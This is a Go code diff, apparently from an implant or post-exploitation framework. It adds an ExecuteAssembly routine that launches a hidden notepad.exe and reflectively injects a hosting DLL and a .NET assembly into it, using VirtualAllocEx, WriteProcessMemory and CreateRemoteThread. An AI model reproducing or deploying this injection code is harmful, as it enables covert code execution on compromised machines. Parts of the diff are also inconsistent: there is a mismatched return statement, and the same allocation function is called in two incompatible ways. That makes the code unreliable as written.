@@ -1,6 +1,10 @@
 package taskrunner
 
 import (
+	"bytes"
+	"fmt"
+	"io"
+	"os/exec"
 	"syscall"
 	"unsafe"
 
@@ -10,10 +14,11 @@ import (
 )
 
 const (
-	MEM_COMMIT             = 0x001000
-	MEM_RESERVE            = 0x002000
-	PAGE_EXECUTE_READWRITE = 0x000040
-	PROCESS_ALL_ACCESS     = 0x1F0FFF
+	MEM_COMMIT          = 0x001000
+	MEM_RESERVE         = 0x002000
+	BobLoaderOffset     = 0x00000af0
+	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
+	MAX_ASSEMBLY_LENGTH = 1025024
 )
 
 var (
@@ -27,7 +32,7 @@ var (
 
 func sysAlloc(size int) (uintptr, error) {
 	n := uintptr(size)
-	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
 		return 0, err
 	}
@@ -53,7 +58,7 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	// {{if .Debug}}
 	log.Println("creating native data buffer ...")
 	// {{end}}
-	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
 	if dataAddr == 0 {
 		return err
 	}
@@ -66,7 +71,7 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	// {{if .Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -131,4 +136,77 @@ func LocalTask(data []byte) error {
 	// {{end}}
 	_, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
 	return err
+}
+
+func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error) {
+
+	if len(assembly) > MAX_ASSEMBLY_LENGTH {
+		return fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
+	}
+	cmd := exec.Command("notepad.exe")
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+	}
+	var stdoutBuf, stderrBuf bytes.Buffer
+	stdoutIn, _ := cmd.StdoutPipe()
+	stderrIn, _ := cmd.StderrPipe()
+
+	var errStdout, errStderr error
+	cmd.Start()
+	pid := cmd.Process.Pid
+	// OpenProcess with PROC_ACCESS_ALL
+	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	if err != nil {
+		return "", err
+	}
+	// VirtualAllocEx to allocate a new memory segment into the target process
+	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		return "", err
+	}
+	// WriteProcessMemory to write the reflective loader into the process
+	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
+	if err != nil {
+		return "", err
+	}
+	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
+	// Total size to allocate = assembly size + 1024 bytes for the args
+	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
+	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
+	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+	if err != nil {
+		return "", err
+	}
+	// Padd arguments with 0x00 -- there must be a cleaner way to do that
+	paramsBytes := []byte(params)
+	padding := make([]byte, 1024-len(params))
+	final := append(paramsBytes, padding...)
+	// Final payload: params + assembly
+	final = append(final, assembly...)
+	// WriteProcessMemory to write the .NET assembly + args
+	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
+	if err != nil {
+		return "", err
+	}
+	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	// CreateRemoteThread(DLL addr + offset, assembly addr)
+	attr := new(syscall.SecurityAttributes)
+	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	if err != nil {
+		return "", err
+	}
+
+	go func() {
+		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
+	}()
+	_, errStderr = io.Copy(&stderrBuf, stderrIn)
+
+	if errStdout != nil || errStderr != nil {
+		log.Fatal("failed to capture stdout or stderr\n")
+	}
+	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
+	if len(errStr) > 1 {
+		return "", fmt.Errorf(errStr)
+	}
+	return outStr, nil
 }
